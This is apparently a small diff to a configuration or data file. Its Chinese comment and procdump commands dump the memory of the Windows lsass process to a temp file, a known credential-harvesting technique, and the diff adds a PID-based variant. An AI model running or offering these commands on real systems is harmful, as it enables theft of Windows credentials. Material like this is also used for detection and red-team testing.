@@ -4,4 +4,4 @@ data: |
   # 转储lsass进程内存
   procdump.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass.dmp
 
-  
+  procdump.exe -accepteula -ma <PID> C:\Windows\Temp\lsass.dmp
